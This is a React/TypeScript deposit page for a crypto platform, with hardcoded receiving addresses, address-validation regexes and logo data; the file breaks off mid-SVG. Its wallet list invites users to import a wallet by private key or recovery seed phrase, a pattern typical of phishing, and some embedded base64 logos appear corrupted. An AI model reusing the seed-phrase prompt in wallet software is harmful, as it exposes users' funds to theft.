import React, { useState, useEffect } from 'react';
import { WalletLogo } from './WalletLogo';
import { motion, AnimatePresence } from 'motion/react';
import { PRESTIGIOUS_COUNTRIES } from '../../data/prestigiousCountries';
import { QRCodeSVG } from 'qrcode.react';
import { copyToClipboard } from '../../lib/clipboard';
import { 
  ShieldCheck, 
  CreditCard, 
  Wallet, 
  Coins, 
  Building2, 
  ArrowLeft, 
  Lock, 
  Copy, 
  Check, 
  QrCode, 
  Upload, 
  ExternalLink, 
  AlertCircle, 
  Clock, 
  CheckCircle2, 
  ChevronRight,
  Sparkles,
  RefreshCw,
  Globe,
  HelpCircle,
  XCircle,
  WifiOff,
  Radio,
  KeyRound,
  Landmark,
  ShieldAlert,
  Search,
  Camera,
  Handshake,
  X,
  Eye,
  EyeOff,
  Shield,
  Key,
  ArrowDownToLine
} from 'lucide-react';
import { db, auth, safeAddDoc } from '../../lib/firebase';
import { collection, addDoc, setDoc, serverTimestamp, doc, onSnapshot, updateDoc } from 'firebase/firestore';
import { useAuth } from '../../contexts/AuthContext';
import CoinLogo from '../CoinLogo';

interface InstitutionalDepositPageProps {
  theme?: 'light' | 'dark';
  onBack?: () => void;
  onClose?: () => void;
  onSuccessDeposit?: (amount: number, method: string) => void;
  onOpenSupport?: (ticketData: any) => void;
  onOpenHistory?: () => void;
}

type FundingMethod = 'card' | 'walletconnect' | 'crypto' | 'bank';

interface CryptoAsset {
  symbol: string;
  name: string;
  network: string;
  icon: string;
  address: string;
  estTime: string;
}

export interface BlockchainNetwork {
  id: string;
  name: string;
  symbol: string;
  badge: string;
  type: 'evm' | 'solana' | 'tron' | 'bitcoin';
  description: string;
}

export const BLOCKCHAIN_NETWORKS: BlockchainNetwork[] = [
  { id: 'eth', name: 'Ethereum', symbol: 'ERC-20', badge: 'Ethereum', type: 'evm', description: 'Layer 1 Smart Contracts' },
  { id: 'bsc', name: 'BNB Smart Chain', symbol: 'BEP-20', badge: 'BNB Chain', type: 'evm', description: 'High-Speed BEP-20 Standard' },
  { id: 'sol', name: 'Solana', symbol: 'SPL', badge: 'Solana', type: 'solana', description: 'Ultra-Fast SPL Protocol' },
  { id: 'tron', name: 'TRON', symbol: 'TRC-20', badge: 'Tron', type: 'tron', description: 'TRC-20 Token Protocol' },
  { id: 'polygon', name: 'Polygon', symbol: 'POS', badge: 'Polygon', type: 'evm', description: 'POS Scalable Network' },
  { id: 'btc', name: 'Bitcoin', symbol: 'BTC', badge: 'Bitcoin', type: 'bitcoin', description: 'Decentralized P2P Network' },
  { id: 'arbitrum', name: 'Arbitrum One', symbol: 'ARB', badge: 'L2', type: 'evm', description: 'Optimistic L2 Scaling' },
  { id: 'avalanche', name: 'Avalanche C-Chain', symbol: 'AVAX', badge: 'C-Chain', type: 'evm', description: 'Subnet EVM Standard' },
];

export const validateWalletAddress = (address: string, networkType: 'evm' | 'solana' | 'tron' | 'bitcoin', networkName: string): { valid: boolean; error?: string } => {
  const trimmed = address.trim();
  if (!trimmed) {
    return { valid: false, error: 'Please enter a wallet address.' };
  }

  if (networkType === 'evm') {
    const isEvm = /^0x[a-fA-F0-9]{40}$/.test(trimmed);
    if (!isEvm) {
      return { 
        valid: false, 
        error: `Invalid ${networkName} address format. EVM addresses must start with "0x" followed by 40 hexadecimal characters.` 
      };
    }
  } else if (networkType === 'solana') {
    const isSol = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed);
    if (!isSol) {
      return { 
        valid: false, 
        error: `Invalid ${networkName} address format. Solana addresses must be a valid Base58 string (32-44 characters).` 
      };
    }
  } else if (networkType === 'tron') {
    const isTron = /^T[a-zA-Z0-9]{33}$/.test(trimmed);
    if (!isTron) {
      return { 
        valid: false, 
        error: `Invalid ${networkName} address format. TRON TRC-20 addresses must start with "T" and be 34 characters long.` 
      };
    }
  } else if (networkType === 'bitcoin') {
    const isBtc = /^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-Z0-9]{25,90})$/i.test(trimmed);
    if (!isBtc) {
      return { 
        valid: false, 
        error: `Invalid ${networkName} address format. BTC addresses must start with 1, 3, or bc1.` 
      };
    }
  }

  return { valid: true };
};

const CRYPTO_ASSETS: CryptoAsset[] = [
  { symbol: 'BTC', name: 'Bitcoin', network: 'Bitcoin Network', icon: '₿', address: 'bc1qkaw6jwev9mj65ywmy8h4rtjhdea3epvh08st03', estTime: '30-60 mins (3 confirmations)' },
  { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum (ERC-20)', icon: 'Ξ', address: '0x8372A7eAde07B979333866544696aBbc6e49DF36', estTime: '12-15 mins (12 confirmations)' },
  { symbol: 'USDT-ERC20', name: 'Tether USD', network: 'Ethereum (ERC-20)', icon: '₮', address: '0x8372A7eAde07B979333866544696aBbc6e49DF36', estTime: '5-10 mins' },
  { symbol: 'USDT-TRC20', name: 'Tether USD', network: 'Tron (TRC-20)', icon: '₮', address: 'TNNeWNf9ijxThGLpdDYu8sQCHZGhh1dXpV', estTime: '2-3 mins' },
  { symbol: 'USDC-ERC20', name: 'USD Coin', network: 'Ethereum (ERC-20)', icon: '💵', address: '0x8372A7eAde07B979333866544696aBbc6e49DF36', estTime: '5-10 mins' },
  { symbol: 'SOL', name: 'Solana', network: 'Solana Mainnet', icon: '🟣', address: '59buTDdJmxbZ2KFuyc264bWzJpsCsaGmEvDg8Mni5DXi', estTime: '1-2 mins (1 confirmation)' },
  { symbol: 'BNB', name: 'BNB Smart Chain', network: 'BNB Chain (BEP-20)', icon: '🟡', address: '0x8372A7eAde07B979333866544696aBbc6e49DF36', estTime: '3-5 mins' },
];

export const OTHER_CRYPTO_ASSETS: CryptoAsset[] = [
  { 
    symbol: 'XRP', 
    name: 'Ripple', 
    network: 'XRP Ledger (XRPL)', 
    icon: '✕', 
    address: 'rKA4CT2vkU5PfcNNmwvcgWWRagr2dG1Buv', 
    estTime: '1-3 mins (1 confirmation)' 
  },
  { 
    symbol: 'ADA', 
    name: 'Cardano', 
    network: 'Cardano (ADA)', 
    icon: '₳', 
    address: 'addr1qxggzzdajz7s97lchgm6xh5q372khh6grxfdqlrrmf8t6xywlvejl2vmw5pmezma6g4wp6ufcs0cth3m6k2rsuvyvn0qdgccuq', 
    estTime: '3-5 mins (15 confirmations)' 
  },
  { 
    symbol: 'AVAX', 
    name: 'Avalanche', 
    network: 'Avalanche C-Chain', 
    icon: '🔺', 
    address: '0x8372A7eAde07B979333866544696aBbc6e49DF36', 
    estTime: '1-2 mins (1 confirmation)' 
  },
  { 
    symbol: 'DOGE', 
    name: 'Dogecoin', 
    network: 'Dogecoin Network', 
    icon: 'Ð', 
    address: 'DPvG6GmCxjUTmW8mPGnWTLWfWAXJSGych1', 
    estTime: '5-10 mins (6 confirmations)' 
  },
  { 
    symbol: 'TRX', 
    name: 'TRON', 
    network: 'Tron (TRC-20)', 
    icon: '⟁', 
    address: 'TNNeWNf9ijxThGLpdDYu8sQCHZGhh1dXpV', 
    estTime: '2-3 mins (19 confirmations)' 
  },
];

export const ALL_CRYPTO_ASSETS: CryptoAsset[] = [...CRYPTO_ASSETS, ...OTHER_CRYPTO_ASSETS];

const WALLETS = [
  { name: 'MetaMask', icon: '🦊', desc: 'Connect using browser extension or mobile app' },
  { name: 'WalletConnect', icon: '⚡', desc: 'Connect with 100+ mobile & desktop wallets' },
  { name: 'Coinbase Wallet', icon: '🔵', desc: 'Secure institutional self-custody' },
  { name: 'Phantom', icon: '👻', desc: 'High-speed multi-chain connection' },
  { name: 'Trust Wallet', icon: '🛡️', desc: 'Decentralized multi-asset vault' },
  { name: 'Rabby Wallet', icon: '🐰', desc: 'Advanced institutional web3 wallet' },
  { name: 'Import Existing Wallet', icon: '🔑', desc: 'Use private key or recovery seed phrase' },
];

const getCryptoLogoDataUrl = (symbol: string): string => {
  let s = (symbol || '').toUpperCase();
  if (s.startsWith('USDT')) s = 'USDT';
  if (s.startsWith('USDC')) s = 'USDC';
  
  const logoUrls: Record<string, string> = {
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    USDC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/3408.png',
    XRP: 'https://s2.coinmarketcap.com/static/img/coins/64x64/52.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    AVAX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5805.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
  };
  if (logoUrls[s]) return logoUrls[s];

  switch (symbol) {
    case 'XRP':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzIzMjkyRiIvPjxwYXRoIGQ9Ik0yMi44IDkuNWgyLjVsLTUuOCA1LjcgNi4xIDYuMWgtMi41bC00LjktNC45LTQuOSA0LjloLTIuNWw2LjEtNi4xLTUuOC01LjdoMi41bDQuNiA0LjUgNC42LTQuNXoiIGZpbGw9IndoaXRlIi8+PC9zdmc+';
    case 'BTC':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iI0Y3OTMxQSIvPjxwYXRoIGQ9Ik0yMi4zMSAxNC4wNWMuMjQtMS42My0uOTktMi41MS0yLjY4LTMuMWwuNTUtMi4yaC0xLjM0bC0uNTMgMi4xNGMtLjM1LS4wOS0uNzEtLjE3LTEuMDctLjI1bC41NC0yLjE1aC0xLjM0bC0uNTUgMi4yYy0uMjktLjA3LS41OC0uMTMtLjg2LS4ybC4wMS0uMDMtMS44NS0uNDYtLjM2IDEuNDNzMS4wMC4yMy45Ny4yNGMuNTQuMTQuNjQuNS42Mi43OGwtLjYyIDIuNWMuMDQuMDEuMDkuMDIuMTQuMDRsLS4xNC0uMDQtLjg3IDMuNTFjLS4wNy4xNy0uMjQuNDMtLjYzLjMzLjAyLjAyLS45Ny0uMjQtLjk3LS4yNGwtLjY3IDEuNTQgMS43NS40NGMuMzIuMDguNjQuMTcuOTYuMjRsLS41NiAyLjI0aDEuMzRsLjU2LTIuMjRjLjM3LjEuNzIuMTkgMS4wNy4yN2wtLjU1IDIuMjFoMS4zNGwuNTYtMi4yNGMyLjI5LjQzIDQuMDIuMjYgNC43NC0xLjgxLjU4LTEuNjctLjAzLTIuNjMtMS4yNC0zLjI2Ljg4LS4yIDEuNTQtLjc4IDEuNzItMS45N3ptLTMuMDggNC4zMWMtLjQyIDEuNjctMy4yMy43Ny00LjE0LjU0bC43NC0yLjk2Yy45MS4yMyAzLjg0LjY4IDMuNCAyLjQyem0uNDItNC4zMmMtLjM4IDEuNTMtMi43My43NS0zLjQ5LjU2bC42Ny0yLjdjLjc2LjE5IDMuMjEuNTUgMi44MiAyLjE0eiIgZmlsbD0id2hpdGUiLz48L3N2Zz4=';
    case 'ETH':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzYyN0VFQSIvPjxwYXRoIGQ9Ik0xNiA0LjVsLS4yMy43N3YxNC40bC4yMy4yMyA2LjY0LTMuOTJMMTYgNC41eiIgZmlsbD0id2hpdGUiIGZpbGwtb3BhY2l0eT0iMC42Ii8+PHBhdGggZD0iTTE2IDQuNUw5LjM2IDE2bDYuNjQgMy45MlY0LjV6IiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik0xNiAyMC4zMmwtLjEzLjE2djYuNzdsLjEzLjM4IDYuNjUtOS4zOS02LjY1IDIuMDh6IiBmaWxsPSJ3aGl0ZSIgZmlsbC1vcGFjaXR5PSIwLjYiLz48cGF0aCBkPSJNMTYgMjcuNjN2LTcuMzFMOS4zNiAxOC4yIDE2IDI3LjYzeiIgZmlsbD0id2hpdGUiLz48cGF0aCBkPSJNMTYgMTkuMTRsNi42NC0zLjkyLTYuNjQtMy.0MnY2Ljk0eiIgZmlsbD0id2hpdGUiIGZpbGwtb3BhY2l0eT0iMC4zIi8+PHBhdGggZD0iTTkuMzYgMTUuMjJsNi42NCAzLjkydi02Ljk0bC02LjY0IDMuMDJ6IiBmaWxsPSJ3aGl0ZSIgZmlsbC1vcGFjaXR5PSIwLjYiLz48L3N2Zz4=';
    case 'USDT-ERC20':
    case 'USDT-TRC20':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzI2QTE3QiIvPjxwYXRoIGQ9Ik0xOC43OCAxMS41M2g0LjQ0VjlIOC43OHYyLjUzaDQuNDR2NS4zOWMtMi4zMS4xNC00IC42LTQgMS4xNXMxLjY5IDEgNCAxLjE1djUuMzhoNC40NHYtNS4zOGMyLjMxLS4xNCA0LS42IDQtMS4xNXMtMS42OS0xLTQtMS4xNXYtNS4zOXptMCA1LjRjMCAuNDgtMS44OS44Ny00LjIyLjg3cy00LjIyLS4zOS00LjIyLS44NyAxLjg5LS44NyA0LjIyLS44NyA0LjIyLjM5IDQuMjIuODd6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==';
    case 'USDC-ERC20':
    case 'USDC-TRC20':
    case 'USDC':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzI3NzVDQSIvPjxwYXRoIGQ9Ik0xNiA1Yy02LjA3NSAwLTExIDQuOTI1LTExIDExczQuOTI1IDExIDExIDExIDExLTQuOTI1IDExLTExLTQuOTI1LTExLTExLTExem0wIDE4LjljLTQuMzYzIDAtNy45LTMuNTM3LTcuOS03LjkgMC00LjM2MyAzLjUzNy03LjkgNy45LTcuOSA0LjM2MyAwIDcuOSAzLjUzNyA3LjkgNy45IDAgNC4zNjMtMy41MzcgNy45LTcuOSA3Ljl6bTIuNDkyLTkuNjEzYzAtMS41NDctMS4xMDctMi4wNzItMi45MDMtMi4yODdWOS43NWgtMS4yMnYyLjIxNWMtMS4zOTcuMDUtMi40ODMuNzQzLTIuNjU3IDEuNzc3aDEuNDkyYy4xMTQtLjQ5Mi43MzgtLjcyMSAxLjE2NC0uNzg3djIuMWMtLjI0Ni4wNjYtMi41NTguNjQtMi41NTggMi4zNzggMCAxLjQ5MiAxLjExNSAyLjExNSAyLjU1OCAyLjI4N3YyLjI0NmgxLjIyVjE5LjdjMS41NTgtLjA2NiAyLjY1Ni0uNzA1IDIuODItMS44NDRoLTEuNDg0Yy0uMTE0LjU0LS43ODcuNzctMS4zMzYuODQ0VjE2LjVjMS40LS4yMzggMi45MjMtLjYyMyAyLjkyMy0yLjIxM3ptLTMuNDgzIDEuMTljLS40MSAwLS45NjgtLjEzMS0uOTY4LS42OTYgMC0uNDg0LjY0My0uNjMxLjk2OC0uNjh2MS4zNzZ6bTEuMTk2IDIuNDE3YzAgLjU0Mi0uNDgzLjczOC0xLjE5Ni44MTJWMTYuNzNjLjQ2Ny4wNzQgMS4xOTYuMjU0IDEuMTk2Ljc5NWwuMDAxLjAwMnoiIGZpbGw9IndoaXRlIi8+PC9zdmc+';
    case 'SOL':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iIzE0MTQxNCIvPjxnPjxwYXRoIGQ9Ik03LjQgMTEuMjNoMTIuM2MuMyAwIC42LS4yLjgtLjVsMS42LTIuOGMuMi0uMy4xLS43LS4yLS45SDkuNmMtLjMgMC0uNi4yLS44LjVMNy4yIDEwYy0uMi40IDAgLjkuMiAxLjIzeiIgZmlsbD0idXJsKCNzb2xHcmFkMSkiLz48cGF0aCBkPSJNMjQuNiAxNS4yaC0xMi4zYy0uMyAwLS42LjItLjguNWwtMS42IDIuOGMtLjIuMy0uMS43LjIuOWgxMi4zYy4zIDAgLjYtLjIuOC0uNWwxLjYtMi44Yy4yLS40LjEtLjctLjItLjl6IiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik03LjQgMjIuODRoMTIuM2MuMyAwIC42LS4yLjgtLjVsMS42LTIuOGMuMi0uMy4xLS43LS4yLS45SDkuNmMtLjMgMC0uNi4yLS44LjVsLTEuNiAyLjhjLS4yLjMgMCAuOS4yLjl6IiBmaWxsPSJ1cmwoI3NvbEdyYWQzKSIvPjwvZz48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9InNvbEdyYWQxIiB4MT0iMjAiIHkxPSI3IiB4Mj0iNyIgeTI9IjExLjIzIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzAwRkZBMyIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI0RDMUZGRiIvPjwvbGluZWFyR3JhZGllbnQ+PGxpbmVhckdyYWRpZW50IGlkPSJzb2xHcmFkMiIgeDE9IjI0Lj6YiIxNS4yIiB4Mj0iOS45IiB5Mj0iMTkuNCIgZ3JhMjllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPjxzdG9wIG9mZnNldD0iMCUiIHN0b3AtY29sb3I9IiMwMEZGQTMiLz48c3RvcCBvZmZzZXQ9IjE0MCUiIHN0b3AtY29sb3I9IiNEQzFGRkYiLz48L2xpbmVhckdyYWRpZW50PjxsaW5lYXJHcmFkaWVudCBpZD0ic29sR3JhZDMiIGgxPSIyMCIgeTE9IjE4LjY0IiB4Mj0iNyIgeTI9IjIyLjg0IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+PHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzAwRkZBMyIvPjxzdG9wIG9mZnNldD0iMTAwJSIgc3RvcC1jb2xvcj0iI0RDMUZGRiIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjwvc3ZnPg==';
    case 'BNB':
      return 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNiIgY3k9IjE2IiByPSIxNiIgZmlsbD0iI0YwQjkwQiIvPjxwYXRoIGQ9Ik0xNiA2LjVsMy4yNCAzLjI0TDE2IDEyLjk4bC0zLj20LTMuMjRMMTYgNi41em03LjMgNy4zbDIuMi0yLjJMMjggMTQuMWwtMi4yIDIuMi0yLjUtMi41em0tMTQuNiAwbDIuNS0yLjUtMi4yLTIuMkw2LjggMTEuNmwyLjIgMi4yek0xNiAyNS41bC0zLjI0LTMuMjQgMy4yNC0zLjI0IDMuMjQgMy4yNEwxNiAyNS41em0xMS4yLTExLjRsMS4zIDEuMy0xMS4yIDExLjJWMjIuNWw3Ljk2LTcuOTYuMDQtLjA0LS4wNC0uMDQtLjA2LS4wNlYxMS42bDIgMi41ek02LjggMTQuMUwxNiAyNS4zdi0yLjhMOC4wNCAxNC41NGwtMS4yNC0uNDR6TTE2IDEyLjk4bDIuNSAyLjUtMi41IDIuNS0yLjUtMi41IDIuNS0yLjV6IiBmaWxsPSJ3aGl0ZSIvPjwvc3ZnPg==';   default:
      return '';
  }
};

interface LogoProps {
  symbol: string;
  className?: string;
}

function CryptoLogo({ symbol, className = "w-5 h-5" }: LogoProps) {
  return <CoinLogo symbol={symbol} className={className} />;

  switch (symbol) {
    case 'BTC':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#F7931A" />
          <path d="M22.31 14.05c.24-1.63-.99-2.51-2.68-3.1l.55-2.2h-1.34l-.53 2.14c-.35-.09-.71-.17-1.07-.25l.54-2.15h-1.34l-.55 2.2c-.29-.07-.58-.13-.86-.2l.01-.03-1.85-.46-.36 1.43s.99.23.97.24c.54.14.64.5.62.78l-.62 2.5c.04.01.09.02.14.04l-.14-.04-.87 3.51c-.07.17-.24.43-.63.33.02.02-.97-.24-.97-.24l-.67 1.54 1.75.44c.32.08.64.17.96.24l-.56 2.24h1.34l.56-2.24c.37.1.72.19 1.07.27l-.55 2.21h1.34l.56-2.24c2.29.43 4.02.26 4.74-1.81.58-1.67-.03-2.63-1.24-3.26.88-.2 1.54-.78 1.72-1.97zm-3.08 4.31c-.42 1.67-3.23.77-4.14.54l.74-2.96c.91.23 3.84.68 3.4 2.42zm.42-4.32c-.38 1.53-2.73.75-3.49.56l.67-2.7c.76.19 3.21.55 2.82 2.14z" fill="white" />
        </svg>
      );
    case 'ETH':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#627EEA" />
          <path d="M16 4.5l-.23.77v14.4l.23.23 6.64-3.92L16 4.5z" fill="white" fillOpacity="0.6" />
          <path d="M16 4.5L9.36 16l6.64 3.92V4.5z" fill="white" />
          <path d="M16 20.32l-.13.16v6.77l.13.38 6.65-9.39-6.65 2.08z" fill="white" fillOpacity="0.6" />
          <path d="M16 27.63v-7.31L9.36 18.2 16 27.63z" fill="white" />
          <path d="M16 19.14l6.64-3.92-6.64-3.02v6.94z" fill="white" fillOpacity="0.3" />
          <path d="M9.36 15.22l6.64 3.92v-6.94l-6.64 3.02z" fill="white" fillOpacity="0.6" />
        </svg>
      );
    case 'USDT-ERC20':
    case 'USDT-TRC20':
    case 'USDT':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#26A17B" />
          <path d="M18.78 11.53h4.44V9H8.78v2.53h4.44v5.39c-2.31.14-4 .6-4 1.15s1.69 1 4 1.15v5.38h4.44v-5.38c2.31-.14 4-.6 4-1.15s-1.69-1-4-1.15v-5.39zm0 5.4c0 .48-1.89.87-4.22.87s-4.22-.39-4.22-.87 1.89-.87 4.22-.87 4.22.39 4.22.87z" fill="white" />
        </svg>
      );
    case 'USDC-ERC20':
    case 'USDC-TRC20':
    case 'USDC':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#2775CA" />
          <path d="M16 5c-6.075 0-11 4.925-11 11s4.925 11 11 11 11-4.925 11-11-4.925-11-11-11zm0 18.9c-4.363 0-7.9-3.537-7.9-7.9 0-4.363 3.537-7.9 7.9-7.9 4.363 0 7.9 3.537 7.9 7.9 0 4.363-3.537 7.9-7.9 7.9zm2.492-9.613c0-1.547-1.107-2.072-2.903-2.287V9.75h-1.22v2.215c-1.397.05-2.483.743-2.657 1.777h1.492c.114-.492.738-.721 1.164-.787v2.1c-.246.066-2.558.64-2.558 2.378 0 1.492 1.115 2.115 2.558 2.287v2.246h1.22V19.7c1.558-.066 2.656-.705 2.82-1.844h-1.484c-.114.54-.787.77-1.336.844V16.5c1.4-.238 2.923-.623 2.923-2.213zm-3.483 1.19c-.41 0-.968-.131-.968-.696 0-.484.443-.631.968-.68v1.376zm1.196 2.417c0 .542-.483.738-1.196.812V16.73c.467.074 1.196.254 1.196.795l.001.002z" fill="white" />
        </svg>
      );
    case 'SOL':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#141414" />
          <g>
            <path d="M7.4 11.23h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5L7.2 10c-.2.4 0 .9.2 1.23z" fill="url(#solGrad1_official)" />
            <path d="M24.6 15.2h-12.3c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3-.1.7.2.9h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.4.1-.7-.2-.9z" fill="url(#solGrad2_official)" />
            <path d="M7.4 22.84h12.3c.3 0 .6-.2.8-.5l1.6-2.8c.2-.3.1-.7-.2-.9H9.6c-.3 0-.6.2-.8.5l-1.6 2.8c-.2.3 0 .9.2.9z" fill="url(#solGrad3_official)" />
          </g>
          <defs>
            <linearGradient id="solGrad1_official" x1="20" y1="7" x2="7" y2="11.23" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stopColor="#00FFA3" />
              <stop offset="100%" stopColor="#DC1FFF" />
            </linearGradient>
            <linearGradient id="solGrad2_official" x1="24.6" y1="15.2" x2="9.9" y2="19.4" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stopColor="#00FFA3" />
              <stop offset="100%" stopColor="#DC1FFF" />
            </linearGradient>
            <linearGradient id="solGrad3_official" x1="20" y1="18.64" x2="7" y2="22.84" gradientUnits="userSpaceOnUse">
              <stop offset="0%" stopColor="#00FFA3" />
              <stop offset="100%" stopColor="#DC1FFF" />
            </linearGradient>
          </defs>
        </svg>
      );
    case 'BNB':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="16" cy="16" r="16" fill="#F3BA2F" />
          <path d="M16 6.5l3.24 3.24L16 12.98l-3.24-3.24L16 6.5zm7.3 7.3l2.2-2.2L28 14.1l-2.2 2.2-2.5-2.5zm-14.6 0l2.5-2.5-2.2-2.2L6.8 11.6l2.2 2.2zM16 25.5l-3.24-3.24 3.24-3.24 3.24 3.24L16 25.5zm11.2-11.4l1.3 1.3-11.2 11.2V22.5l7.96-7.96.04-.04-.04-.04-.06-.06V11.6l2 2.5zM6.8 14.1L16 25.3v-2.8L8.04 14.54l-1.24-.44zM16 12.98l2.5 2.5-2.5 2.5-2.5-2.5 2.5-2.5z" fill="white" />
        </svg>
      );
    default:
      return null;
  }
}

function NetworkLogo({ id, className = "w-6 h-6" }: { id: string; className?: string }) {
  switch (id) {
    case 'eth':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#627EEA" fillOpacity="0.2" />
          <path d="M16 4L15.7 5V19.7L16 20L23.5 15.6L16 4Z" fill="#627EEA" />
          <path d="M16 4L8.5 15.6L16 20V12.3V4Z" fill="#8A9DED" />
          <path d="M16 21.4L15.8 21.6V27.7L16 28L23.5 17.5L16 21.4Z" fill="#627EEA" />
          <path d="M16 28V21.4L8.5 17.5L16 28Z" fill="#8A9DED" />
        </svg>
      );
    case 'bsc':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="#F3BA2F" fillOpacity="0.2" />
          <path d="M16 6L20 10L16 14L12 10L16 6Z" fill="#F3BA2F" />
          <path d="M7 15L11 11L15 15L11 19L7 15Z" fill="#F3BA2F" />
          <path d="M25 15L21 11L17 15L21 19L25 15Z" fill="#F3BA2F" />
          <path d="M16 24L20 20L16 16L12 20L16 24Z" fill="#F3BA2F" />
        </svg>
      );
    case 'sol':
      return (
        <svg className={className} viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="32" height="32" rx="8" fill="url(#sol_bg)" fillOpacity="0.2" />
          <path d="M7 21.5L9.5 19H25L22.5 21.5H7Z" fill="url(#sol_1)" />
          <path d="M7 10.5L9.5 8H25L22.5 10.5H7Z" fill="url(#sol_2)" />
          <path d="M7 16L9.5 13.5H25L22.5 16H7Z" fill="url(#sol_3)" />
          <defs>
            <linearGradient id="sol_1" x1="7" y1="19" x2="25" y2="21.5" gradientUnits="userSpaceOnUse">
              <stop stopColor="#00FFA3" />
              <stop offset="1" stopColor="#DC1FFF" />
            </linearGradient>
            <linearGradient id="sol_2" x1="7" y1="8" x2="25" y2="10.5" gradientUnits="userSpaceOnUse">
              <stop stopColor="#00FFA3" />
              <stop offset="1" stopColor="#DC1FFF" />
            </linearGradient>
